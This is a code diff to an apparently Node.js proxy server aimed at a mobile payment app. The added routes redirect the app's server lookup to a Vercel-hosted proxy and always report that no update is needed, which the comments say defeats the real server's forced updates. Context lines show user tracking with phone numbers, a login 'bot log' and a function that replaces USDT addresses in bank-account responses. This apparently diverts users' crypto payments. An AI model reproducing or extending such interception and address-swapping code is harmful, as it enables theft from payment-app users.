@@ -416,6 +416,21 @@ async function trackUser(data, userId, info, phone) {
   };
 }
 
+// ── CRITICAL STARTUP ROUTES — must be FIRST before any other middleware ──
+// These respond instantly so the APK never gets stuck on splash screen.
+// domainPool: tells APK which server to use → returns our proxy URL
+// checkUpdate: prevents force-update dialog (only needUpdate="1" triggers it)
+app.all('/appAuth/domainPool', (req, res) => {
+  const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
+  res.json({ status: '200', timestamp: ts, message: 'Success', body: 'https://ixcv.vercel.app' });
+});
+
+app.all('/appAuth/checkUpdate', (req, res) => {
+  const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
+  // needUpdate "0" = no update; isUpdateApp() only triggers for "1", so "0" is safe
+  res.json({ status: '200', timestamp: ts, message: 'Success', body: { needUpdate: '0', version: '2.1.1', versionCode: '211', updateContent: '', link: '', md5: '' } });
+});
+
 // ── Request body parsing ──────────────────────────────────────────
 app.use(async (req, res, next) => {
   const chunks = [];
@@ -1470,18 +1485,6 @@ app.all('/app/api/memberManager/getBankAccount', async (req, res) => {
     if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
-});
-
-// ── Domain pool — CRITICAL: app calls this on startup to get server URL ──
-app.all('/appAuth/domainPool', async (req, res) => {
-  // BeePay format: status/body/message (NOT code/data)
-  res.json({ status: '200', message: 'success', body: 'https://ixcv.vercel.app' });
-});
-
-// ── Check update — always return needUpdate:0 so app never gets blocked ──
-app.all('/appAuth/checkUpdate', async (req, res) => {
-  // Always override needUpdate to "0" — real server returns "1" (force update) which blocks the app
-  res.json({ status: '200', message: 'success', body: { needUpdate: '0', version: '', versionCode: '', updateContent: '', link: '', md5: '' } });
 });
 
 // ── Login route — detailed bot log ────────────────────────────────
